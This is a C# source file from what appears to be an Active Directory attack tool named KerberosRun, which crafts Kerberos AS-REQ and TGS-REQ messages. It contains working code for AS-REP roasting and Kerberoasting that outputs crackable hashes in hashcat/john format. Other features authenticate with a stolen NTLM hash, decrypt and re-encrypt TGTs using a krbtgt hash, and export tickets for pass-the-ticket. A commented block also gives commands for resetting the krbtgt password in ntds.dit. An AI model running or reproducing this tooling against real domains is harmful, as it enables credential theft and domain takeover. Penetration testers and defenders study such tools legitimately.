using System;
using Kerberos.NET.Client;
using Kerberos.NET.Credentials;
using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;
using System.Threading;
using Kerberos.NET.Transport;
using Microsoft.Extensions.Logging;
using Kerberos.NET;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace KerberosRun
{
    class Ask
    {
        private static KerberosKey credKey;
        private static KerberosCredential cred;
        //askTGT
        public static async System.Threading.Tasks.Task<KrbAsRep> askTGT(string kdc,
            ILoggerFactory logger,
            TcpKerberosTransport transport,
            string username,
            string password,
            string domainName,
            bool outKirbi = false,
            bool verbose = false,
            string format = "hashcat",
            bool asreproast = false,
            bool ptt = false,
            string hash = null,
            EncryptionType etype = EncryptionType.RC4_HMAC_NT,
            bool outfile = false,
            string tgtHash = null,
            EncryptionType tgtEtype = EncryptionType.AES256_CTS_HMAC_SHA1_96
            )
        {
            var now = DateTime.Now;

            Console.WriteLine("[*] Starting Kerberos Authentication ...");

            if (password != null)
            { cred = new KerberosPasswordCredential(username, password, domainName); }
            else
            { cred = new Utils.KerberosHashCreds(username, hash, etype, domainName); }

            credKey = cred.CreateKey();
            
            //Pre-Auth
            KrbAsReq asReqMessage = null;
            KrbAsRep asRep = null;
            bool notPreauth = true;
            AuthenticationOptions authOptions =
            AuthenticationOptions.IncludePacRequest |
            AuthenticationOptions.RenewableOk |
            AuthenticationOptions.Canonicalize |
            AuthenticationOptions.Renewable |
            AuthenticationOptions.Forwardable;
            int authAttempt = 0;

            while (notPreauth)
            {
                authAttempt += 1;

                try
                {
                    Console.WriteLine("[*] Sending AS-REQ ...");

                    var kdcOptions = (KdcOptions)(authOptions & ~AuthenticationOptions.AllAuthentication);

                    var hostAddress = Environment.MachineName;

                    var pacRequest = new KrbPaPacRequest
                    {
                        IncludePac = authOptions.HasFlag(AuthenticationOptions.IncludePacRequest)
                    };

                    var padata = new List<KrbPaData>()
                    {
                        new KrbPaData
                        {
                            Type = PaDataType.PA_PAC_REQUEST,
                            Value = pacRequest.Encode()
                        }
                    };

                    
                    asReqMessage = new KrbAsReq()
                    {
                        Body = new KrbKdcReqBody
                        {
                            Addresses = new[]
                            {
                                new KrbHostAddress
                                {
                                    AddressType = AddressType.NetBios,
                                    Address = Encoding.ASCII.GetBytes(hostAddress.PadRight(16, ' '))
                                }
                            },
                            CName = new KrbPrincipalName()
                            {
                                Type = PrincipalNameType.NT_PRINCIPAL,
                                Name = new[] { username }// + "@" + domainName.ToUpper() }
                            },
                            //KrbPrincipalName.FromString(
                            //    username,
                            //   PrincipalNameType.NT_ENTERPRISE,
                            //    domainName
                            //),
                            EType = KrbConstants.KerberosConstants.ETypes.ToArray(),//kdcReqEtype, 
                            KdcOptions = kdcOptions,
                            Nonce = KrbConstants.KerberosConstants.GetNonce(),
                            RTime = KrbConstants.KerberosConstants.EndOfTime,
                            Realm = credKey.PrincipalName.Realm,
                            SName = new KrbPrincipalName
                            {
                                Type = PrincipalNameType.NT_SRV_INST,
                                Name = new[] { "krbtgt", credKey.PrincipalName.Realm }
                            },
                            Till = KrbConstants.KerberosConstants.EndOfTime
                        },
                        PaData = padata.ToArray()
                    };

                    if (authOptions.HasFlag(AuthenticationOptions.PreAuthenticate))
                    {
                        var ts = new KrbPaEncTsEnc()
                        {
                            PaTimestamp = now,
                            PaUSec = now.Millisecond,
                        };

                        var tsEncoded = ts.Encode();

                        var padataAs = asReqMessage.PaData.ToList();
                        
                        KrbEncryptedData encData = KrbEncryptedData.Encrypt(
                            tsEncoded,
                            credKey,
                            KeyUsage.PaEncTs
                        );

                        padataAs.Add(new KrbPaData
                        {
                            Type = PaDataType.PA_ENC_TIMESTAMP,
                            Value = encData.Encode()
                        });

                        asReqMessage.PaData = padataAs.ToArray();
                    }

                    //AS-Req Part
                    if (verbose) { PrintFunc.PrintReq(asReqMessage, credKey); }

                    var asReq = asReqMessage.EncodeApplication();

                    asRep = await transport.SendMessage<KrbAsRep>(
                        domainName,
                        asReq,
                        default(CancellationToken));
                    
                }
                catch (KerberosProtocolException pex)
                {
                    Console.WriteLine("[x] Kerberos Error: {0}", pex.Message);

                    if (pex?.Error?.ErrorCode == KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED)
                    {
                        if (asreproast)
                        {
                            Console.WriteLine("[x] Sorry the provided user requires PreAuth.\n");
                            Environment.Exit(0);
                        }
                        else
                        {
                            //Salt issue for RID 500 Built-in admin account
                            //https://github.com/dotnet/Kerberos.NET/issues/164
                            if (password != null)
                            { cred = new KerberosPasswordCredential(username, password, domainName); }
                            else
                            { cred = new Utils.KerberosHashCreds(username, hash, etype, domainName); }

                            cred.IncludePreAuthenticationHints(pex?.Error?.DecodePreAuthentication());
                            credKey = cred.CreateKey();

                            authOptions |= AuthenticationOptions.PreAuthenticate;
                            Console.WriteLine("[*] Adding encrypted timestamp ...");
                        }
                       
                    }
                    else if (pex?.Error?.ErrorCode == KerberosErrorCode.KDC_ERR_PREAUTH_FAILED)
                    {
                        Console.WriteLine("[x] Invalid Credential! Authentication Stopped ...\n");
                        Environment.Exit(0);
                    }
                    else
                    {
                        Console.WriteLine("[x] Authentication Stopped ...\n");
                        Environment.Exit(0);
                    }
                }
                if (authAttempt == 2 || asreproast)
                {
                    notPreauth = false;
                }

            }

            Console.WriteLine("[*] Receiving AS-REP...");

            if (asreproast)
            {
                //Asreproasting
                string repHash = BitConverter.ToString(asRep.EncPart.Cipher.ToArray()).Replace("-", string.Empty);
                repHash = repHash.Insert(32, "$");

                string hashString = "";
                if (format == "john")
                {
                    hashString = String.Format("$krb5asrep${0}@{1}:{2}", username, domainName, repHash);
                    Console.WriteLine("[+] ASREPRoasting Hash: {0}", hashString);
                }
                else
                {
                    hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", username, domainName, repHash);
                    Console.WriteLine("[+] ASREPRoasting Hash: {0}", hashString);
                }
            }
            else
            {
                try
                {
                    KrbEncAsRepPart asDecryptedRepPart = cred.DecryptKdcRep(
                            asRep,
                            KeyUsage.EncAsRepPart,
                            d => KrbEncAsRepPart.DecodeApplication(d));

                    if (verbose)
                    {
                        //AS-Rep Part
                        PrintFunc.PrintRep(asRep, credKey);

                        if (authOptions.HasFlag(AuthenticationOptions.PreAuthenticate))
                        {
                            Console.WriteLine("    * [Decrypted Enc-Part]:");

                            PrintFunc.PrintRepEnc(asDecryptedRepPart, credKey);


                            ////////////////////////////////////////decrypt TGT
                            //// net stop ntds
                            //// $key =Get-BootKey -Online
                            //// $cred =  ConvertTo-SecureString -String "krbtgt" -AsPlainText -Force
                            //// Set-ADDBAccountPassword -SamAccountName krbtgt -NewPassword $cred -DatabasePath C:\Windows\NTDS\ntds.dit -BootKey $key
                            //// net start ntds

                            ////KeyTable keytab = new KeyTable(System.IO.File.ReadAllBytes("C:\\Users\\Public\\krbtgt.keytab"));
                            ////var krbtgtkey = keytab.GetKey(EncryptionType.AES256_CTS_HMAC_SHA1_96, asRep.Ticket.SName);
                            ///

                            if (!string.IsNullOrEmpty(tgtHash))
                            {
                                var krbtgtCred = new Utils.KerberosHashCreds("krbtgt", tgtHash, tgtEtype);

                                //TGS - REQ Ticket Enc-Part
                                var ticketDecrypted = asRep.Ticket.EncryptedPart.Decrypt
                                    (krbtgtCred.CreateKey(),
                                    KeyUsage.Ticket,
                                    b => KrbEncTicketPart.DecodeApplication(b));
                                Console.WriteLine("   * [Decrypted TGT]:");
                                PrintFunc.PrintTicketEnc(ticketDecrypted);
                                //Encrypt the ticket again
                                asRep.Ticket.EncryptedPart = KrbEncryptedData.Encrypt(ticketDecrypted.EncodeApplication(),
                                    krbtgtCred.CreateKey(), KeyUsage.Ticket);
                            }

                            //////////////////////////////////////TGT
                        }
                    }

                    if (outKirbi || outfile)
                    {
                        var kirbiTGT = Kirbi.toKirbi(asRep, asDecryptedRepPart, ptt);
                        if (outKirbi)
                        {
                            Console.WriteLine("[+] TGT Kirbi:");
                            Console.WriteLine("    - {0}", Convert.ToBase64String(kirbiTGT));
                        }
                        if (outfile)
                        {
                            Utils.Utils.WriteBytesToFile(Utils.Utils.MakeTicketFileName(username), kirbiTGT);
                        }
                    }
                    
                }
                catch (Exception e)
                {
                    Console.WriteLine("[x] {0}. Unable to decrypt the ticket, provided credential is invalid. (Check the ticket etype if you want to decrypt it)\n", e.Message);
                    //Environment.Exit(0);
                }
            }



            return (KrbAsRep)asRep;
            
        }



        //askTGS
        public static async System.Threading.Tasks.Task<TicketFlags> askTGS(string kdc,
            ILoggerFactory logger,
            TcpKerberosTransport transport,
            KrbAsRep asRep,
            string username,
            string password,
            string domainName,
            string spn,
            bool isUnconstrained = false,
            bool outKirbi = false,
            bool verbose = false,
            bool kerberoast = false,
            bool ptt = false,
            string hash = null,
            EncryptionType etype = EncryptionType.RC4_HMAC_NT,
            bool outfile = false,
            string srvName = null,
            string tgsHash = null,
            EncryptionType tgsEtype = EncryptionType.AES256_CTS_HMAC_SHA1_96
            )
        {

            var now = DateTime.Now;

            credKey = password != null ?
                new KerberosPasswordCredential(username, password, domainName).CreateKey() :
                new Utils.KerberosHashCreds(username, hash, etype, domainName).CreateKey();


            KrbEncAsRepPart asDecrypted = cred.DecryptKdcRep(
                 asRep,
                 KeyUsage.EncAsRepPart,
                 d => KrbEncAsRepPart.DecodeApplication(d));

            var sessionKey = asDecrypted.Key;




            //Request Service Ticket parameters

            ApOptions apOptions = ApOptions.Reserved;
            KdcOptions kdcOptions =
            KdcOptions.Forwardable |
            KdcOptions.Renewable |
            KdcOptions.RenewableOk |
            KdcOptions.Canonicalize;
            string s4u = null;
            KrbTicket s4uTicket = null;
            KrbTicket u2uServerTicket = null;

            if (isUnconstrained)
            {
                spn = $"krbtgt/{domainName}";
                kdcOptions |= KdcOptions.Forwarded;
            }


            var rst = new RequestServiceTicket()
            {
                ServicePrincipalName = spn,
                ApOptions = apOptions,
                S4uTarget = s4u,
                S4uTicket = s4uTicket,
                UserToUserTicket = u2uServerTicket,
                KdcOptions = kdcOptions,
                Realm = domainName
            };


            var sname = rst.ServicePrincipalName.Split('/', '@');
            //var sname = new string[] { rst.ServicePrincipalName };

            var tgt = asRep.Ticket;

            var additionalTickets = new List<KrbTicket>();

            if (rst.KdcOptions.HasFlag(KdcOptions.EncTktInSkey) && rst.UserToUserTicket != null)
            {
                additionalTickets.Add(rst.UserToUserTicket);
            }
            if (!string.IsNullOrWhiteSpace(rst.S4uTarget))
            {
                rst.KdcOptions |= KdcOptions.Forwardable;
            }
            if (rst.S4uTicket != null)
            {
                rst.KdcOptions |= KdcOptions.ConstrainedDelegation;

                additionalTickets.Add(rst.S4uTicket);
            }

            
            var body = new KrbKdcReqBody
            {
                //Specify RC4 as the only supported EType
                EType = new[] { EncryptionType.RC4_HMAC_NT },//KrbConstants.KerberosConstants.ETypes.ToArray(),
                KdcOptions = rst.KdcOptions,
                Nonce = KrbConstants.KerberosConstants.GetNonce(),
                Realm = rst.Realm,
                SName = new KrbPrincipalName()
                {
                    Type = PrincipalNameType.NT_PRINCIPAL,
                    //Type = (PrincipalNameType)Utils.Utils.PrincipalNameType.NT_MS_PRINCIPAL,
                    Name = sname
                },
                Till = KrbConstants.KerberosConstants.EndOfTime,
                CName = rst.CNameHint
            };

            if (additionalTickets.Count > 0)
            {
                body.AdditionalTickets = additionalTickets.ToArray();
            }

            var bodyChecksum = KrbChecksum.Create(
                body.Encode(),
                sessionKey.AsKey(),
                KeyUsage.PaTgsReqChecksum
            );

            //ApReq
            //Authenticator
            var authenticator = new KrbAuthenticator
            {
                CName = asRep.CName,
                Realm = asRep.Ticket.Realm,
                SequenceNumber = KrbConstants.KerberosConstants.GetNonce(),
                Checksum = bodyChecksum,
                CTime = now,
                CuSec = now.Millisecond //new Random().Next(0, 999999)
            };

            var subSessionKey = KrbEncryptionKey.Generate(sessionKey.EType);

            subSessionKey.Usage = KeyUsage.EncTgsRepPartSubSessionKey;
            authenticator.Subkey = subSessionKey;

            var encryptedAuthenticator = KrbEncryptedData.Encrypt(
                authenticator.EncodeApplication(),
                sessionKey.AsKey(),
                KeyUsage.PaTgsReqAuthenticator
            );

            var apReq = new KrbApReq
            {
                Ticket = tgt,
                ApOptions = apOptions,
                Authenticator = encryptedAuthenticator
            };


            var pacOptions = new KrbPaPacOptions
            {
                Flags = PacOptions.BranchAware
            }.Encode();

            var paData = new List<KrbPaData>()
            {
                new KrbPaData
                {
                    Type = PaDataType.PA_TGS_REQ,
                    Value = apReq.EncodeApplication()
                },
                new KrbPaData
                {
                    Type = PaDataType.PA_PAC_OPTIONS,
                    Value = pacOptions
                }
            };



            if (!string.IsNullOrWhiteSpace(rst.S4uTarget))
            {
                var paS4u = new KrbPaForUser
                {
                    AuthPackage = "Kerberos",
                    UserName = new KrbPrincipalName { Type = PrincipalNameType.NT_ENTERPRISE, Name = new[] { s4u } },
                    UserRealm = tgt.Realm
                };
                paS4u.GenerateChecksum(subSessionKey.AsKey());

                paData.Add(new KrbPaData
                {
                    Type = PaDataType.PA_FOR_USER,
                    Value = paS4u.Encode()
                });
            }

            var tgs = new KrbTgsReq
            {
                PaData = paData.ToArray(),
                Body = body
            };



            ReadOnlyMemory<byte> encodedTgs = tgs.EncodeApplication();


            Console.WriteLine("[*] Sending TGS-REQ ...");
            if (verbose) { PrintFunc.PrintReq(tgs, credKey, sessionKey.AsKey()); }
            


            CancellationToken cancellation = default;
            cancellation.ThrowIfCancellationRequested();



            KrbTgsRep tgsRep = null;
            try
            {
                tgsRep = await transport.SendMessage<KrbTgsRep>(
                rst.Realm,
                encodedTgs,
                cancellation
                );
            }
            catch (KerberosProtocolException pex)
            {
                Console.WriteLine("[x] Kerberos Error: {0}\n", pex.Message);
                Environment.Exit(0);
            }


            Console.WriteLine("[*] Receiving TGS-REP ...");
            if (verbose) { PrintFunc.PrintRep(tgsRep, credKey); }










            var returnFlag = TicketFlags.Anonymous;

            try
            {
                //TGS-REP Enc-Part
                //https://github.com/dotnet/Kerberos.NET/blob/develop/Kerberos.NET/Entities/Krb/KrbTgsReq.cs#L144
                KrbEncTgsRepPart tgsDecryptedRepPart = tgsRep.EncPart.Decrypt<KrbEncTgsRepPart>(
                    subSessionKey.AsKey(),
                    KeyUsage.EncTgsRepPartSubSessionKey,
                    (ReadOnlyMemory<byte> t) => KrbEncTgsRepPart.DecodeApplication(t));

                if (verbose)
                {
                    Console.WriteLine("    * [Decrypted Enc-Part]:");
                    PrintFunc.PrintRepEnc(tgsDecryptedRepPart, credKey);

                    returnFlag = tgsDecryptedRepPart.Flags;


                    if (!string.IsNullOrEmpty(tgsHash))
                    {
                        //=========================================
                        //TGS Tiket Enc-Part
                        //Service account Cred
                        var kerbCred2 = new Utils.KerberosHashCreds(srvName, tgsHash, tgsEtype);

                        //TGS-REQ Ticket Enc-Part
                        KrbEncTicketPart ticketDecrypted = tgsRep.Ticket.EncryptedPart.Decrypt<KrbEncTicketPart>
                            (kerbCred2.CreateKey(),
                            KeyUsage.Ticket,
                            (ReadOnlyMemory<byte> t) => KrbEncTicketPart.DecodeApplication(t));

                        Console.WriteLine("    * [Decrypted Ticket Enc-Part]:");
                        PrintFunc.PrintTicketEnc(ticketDecrypted);
                        //=========================================

                    }
                }


                if (outKirbi || outfile)
                {
                    var kirbiTGS = Kirbi.toKirbi(tgsRep, tgsDecryptedRepPart, ptt);
                    if (outKirbi)
                    {
                        Console.WriteLine("[+] TGS Kirbi:");
                        Console.WriteLine("    - {0}", Convert.ToBase64String(kirbiTGS));
                    }
                    if (outfile)
                    {
                        Utils.Utils.WriteBytesToFile(Utils.Utils.MakeTicketFileName(username, sname), kirbiTGS);
                    }
                }

            }
            catch (Exception e)
            {
                Console.WriteLine("[x] {0}", e.Message);
            }
           



            if (kerberoast)
            {
                //Kerberoasting
                var encType = (int)Enum.Parse(typeof(EncryptionType), tgsRep.Ticket.EncryptedPart.EType.ToString());
                var myCipher = (BitConverter.ToString(tgsRep.Ticket.EncryptedPart.Cipher.ToArray())).Replace("-", "");
                var kroasthash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, username, domainName, spn, myCipher.Substring(0, 32), myCipher.Substring(32));
                Console.WriteLine("[+] Kerberoasting Hash: {0}", kroasthash);

            }


            return returnFlag;


        }



        //TODO...
        //askTGS with TGT kirbi
        public static async System.Threading.Tasks.Task<TicketFlags> askTGS2(string kdc,
            ILoggerFactory logger,
            TcpKerberosTransport transport,
            KrbAsRep asRep,
            string username,
            string password,
            string domainName,
            string spn,
            bool isUnconstrained = false,
            bool outKirbi = false,
            bool verbose = false,
            bool kerberoast = false,
            bool ptt = false,
            string hash = null,
            EncryptionType etype = EncryptionType.RC4_HMAC_NT,
            bool outfile = false,
            string srvName = null,
            string tgsHash = null,
            EncryptionType tgsEtype = EncryptionType.AES256_CTS_HMAC_SHA1_96
            )
        {

            var now = DateTime.Now;

            credKey = password != null ?
                new KerberosPasswordCredential(username, password, domainName).CreateKey() :
                new Utils.KerberosHashCreds(username, hash, etype, domainName).CreateKey();


            KrbEncAsRepPart asDecrypted = cred.DecryptKdcRep(
                 asRep,
                 KeyUsage.EncAsRepPart,
                 d => KrbEncAsRepPart.DecodeApplication(d));

            var sessionKey = asDecrypted.Key;




            //Request Service Ticket parameters

            ApOptions apOptions = ApOptions.Reserved;
            KdcOptions kdcOptions =
            KdcOptions.Forwardable |
            KdcOptions.Renewable |
            KdcOptions.RenewableOk |
            KdcOptions.Canonicalize;
            string s4u = null;
            KrbTicket s4uTicket = null;
            KrbTicket u2uServerTicket = null;

            if (isUnconstrained)
            {
                spn = $"krbtgt/{domainName}";
                kdcOptions |= KdcOptions.Forwarded;
            }


            var rst = new RequestServiceTicket()
            {
                ServicePrincipalName = spn,
                ApOptions = apOptions,
                S4uTarget = s4u,
                S4uTicket = s4uTicket,
                UserToUserTicket = u2uServerTicket,
                KdcOptions = kdcOptions,
                Realm = domainName
            };


            var sname = rst.ServicePrincipalName.Split('/', '@');
            var tgt = asRep.Ticket;

            var additionalTickets = new List<KrbTicket>();

            if (rst.KdcOptions.HasFlag(KdcOptions.EncTktInSkey) && rst.UserToUserTicket != null)
            {
                additionalTickets.Add(rst.UserToUserTicket);
            }
            if (!string.IsNullOrWhiteSpace(rst.S4uTarget))
            {
                rst.KdcOptions |= KdcOptions.Forwardable;
            }
            if (rst.S4uTicket != null)
            {
                rst.KdcOptions |= KdcOptions.ConstrainedDelegation;

                additionalTickets.Add(rst.S4uTicket);
            }


            var body = new KrbKdcReqBody
            {
                //Specify RC4 as the only supported EType
                EType = new[] { EncryptionType.RC4_HMAC_NT },//KrbConstants.KerberosConstants.ETypes.ToArray(),
                KdcOptions = rst.KdcOptions,
                Nonce = KrbConstants.KerberosConstants.GetNonce(),
                Realm = rst.Realm,
                SName = new KrbPrincipalName()
                {
                    Type = PrincipalNameType.NT_SRV_INST,
                    Name = sname
                },
                Till = KrbConstants.KerberosConstants.EndOfTime,
                CName = rst.CNameHint
            };

            if (additionalTickets.Count > 0)
            {
                body.AdditionalTickets = additionalTickets.ToArray();
            }

            var bodyChecksum = KrbChecksum.Create(
                body.Encode(),
                sessionKey.AsKey(),
                KeyUsage.PaTgsReqChecksum
            );

            //ApReq
            //Authenticator
            var authenticator = new KrbAuthenticator
            {
                CName = asRep.CName,
                Realm = asRep.Ticket.Realm,
                SequenceNumber = KrbConstants.KerberosConstants.GetNonce(),
                Checksum = bodyChecksum,
                CTime = now,
                CuSec = now.Millisecond //new Random().Next(0, 999999)
            };

            var subSessionKey = KrbEncryptionKey.Generate(sessionKey.EType);

            subSessionKey.Usage = KeyUsage.EncTgsRepPartSubSessionKey;
            authenticator.Subkey = subSessionKey;

            var encryptedAuthenticator = KrbEncryptedData.Encrypt(
                authenticator.EncodeApplication(),
                sessionKey.AsKey(),
                KeyUsage.PaTgsReqAuthenticator
            );

            var apReq = new KrbApReq
            {
                Ticket = tgt,
                ApOptions = apOptions,
                Authenticator = encryptedAuthenticator
            };


            var pacOptions = new KrbPaPacOptions
            {
                Flags = PacOptions.BranchAware
            }.Encode();

            var paData = new List<KrbPaData>()
            {
                new KrbPaData
                {
                    Type = PaDataType.PA_TGS_REQ,
                    Value = apReq.EncodeApplication()
                },
                new KrbPaData
                {
                    Type = PaDataType.PA_PAC_OPTIONS,
                    Value = pacOptions
                }
            };



            if (!string.IsNullOrWhiteSpace(rst.S4uTarget))
            {
                var paS4u = new KrbPaForUser
                {
                    AuthPackage = "Kerberos",
                    UserName = new KrbPrincipalName { Type = PrincipalNameType.NT_ENTERPRISE, Name = new[] { s4u } },
                    UserRealm = tgt.Realm
                };
                paS4u.GenerateChecksum(subSessionKey.AsKey());

                paData.Add(new KrbPaData
                {
                    Type = PaDataType.PA_FOR_USER,
                    Value = paS4u.Encode()
                });
            }

            var tgs = new KrbTgsReq
            {
                PaData = paData.ToArray(),
                Body = body
            };



            ReadOnlyMemory<byte> encodedTgs = tgs.EncodeApplication();


            Console.WriteLine("[*] Sending TGS-REQ ...");
            if (verbose) { PrintFunc.PrintReq(tgs, credKey, sessionKey.AsKey()); }



            CancellationToken cancellation = default;
            cancellation.ThrowIfCancellationRequested();



            KrbTgsRep tgsRep = null;
            try
            {
                tgsRep = await transport.SendMessage<KrbTgsRep>(
                rst.Realm,
                encodedTgs,
                cancellation
                );
            }
            catch (KerberosProtocolException pex)
            {
                Console.WriteLine("[x] Kerberos Error: {0}\n", pex.Message);
                Environment.Exit(0);
            }


            Console.WriteLine("[*] Receiving TGS-REP ...");
            if (verbose) { PrintFunc.PrintRep(tgsRep, credKey); }










            var returnFlag = TicketFlags.Anonymous;

            try
            {
                //TGS-REP Enc-Part
                //https://github.com/dotnet/Kerberos.NET/blob/develop/Kerberos.NET/Entities/Krb/KrbTgsReq.cs#L144
                KrbEncTgsRepPart tgsDecryptedRepPart = tgsRep.EncPart.Decrypt<KrbEncTgsRepPart>(
                    subSessionKey.AsKey(),
                    KeyUsage.EncTgsRepPartSubSessionKey,
                    (ReadOnlyMemory<byte> t) => KrbEncTgsRepPart.DecodeApplication(t));

                if (verbose)
                {
                    Console.WriteLine("    * [Decrypted Enc-Part]:");
                    PrintFunc.PrintRepEnc(tgsDecryptedRepPart, credKey);

                    returnFlag = tgsDecryptedRepPart.Flags;


                    if (!string.IsNullOrEmpty(tgsHash))
                    {
                        //=========================================
                        //TGS Tiket Enc-Part
                        //Service account Cred
                        var kerbCred2 = new Utils.KerberosHashCreds(srvName, tgsHash, tgsEtype);

                        //TGS-REQ Ticket Enc-Part
                        KrbEncTicketPart ticketDecrypted = tgsRep.Ticket.EncryptedPart.Decrypt<KrbEncTicketPart>
                            (kerbCred2.CreateKey(),
                            KeyUsage.Ticket,
                            (ReadOnlyMemory<byte> t) => KrbEncTicketPart.DecodeApplication(t));

                        Console.WriteLine("    * [Decrypted Ticket Enc-Part]:");
                        PrintFunc.PrintTicketEnc(ticketDecrypted);
                        //=========================================

                    }
                }


                if (outKirbi || outfile)
                {
                    var kirbiTGS = Kirbi.toKirbi(tgsRep, tgsDecryptedRepPart, ptt);
                    if (outKirbi)
                    {
                        Console.WriteLine("[+] TGS Kirbi:");
                        Console.WriteLine("    - {0}", Convert.ToBase64String(kirbiTGS));
                    }
                    if (outfile)
                    {
                        Utils.Utils.WriteBytesToFile(Utils.Utils.MakeTicketFileName(username, sname), kirbiTGS);
                    }
                }

            }
            catch (Exception e)
            {
                Console.WriteLine("[x] {0}", e.Message);
            }




            if (kerberoast)
            {
                //Kerberoasting
                var encType = (int)Enum.Parse(typeof(EncryptionType), tgsRep.Ticket.EncryptedPart.EType.ToString());
                var myCipher = (BitConverter.ToString(tgsRep.Ticket.EncryptedPart.Cipher.ToArray())).Replace("-", "");
                var kroasthash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, username, domainName, spn, myCipher.Substring(0, 32), myCipher.Substring(32));
                Console.WriteLine("[+] Kerberoasting Hash: {0}", kroasthash);

            }


            return returnFlag;


        }

    }
}
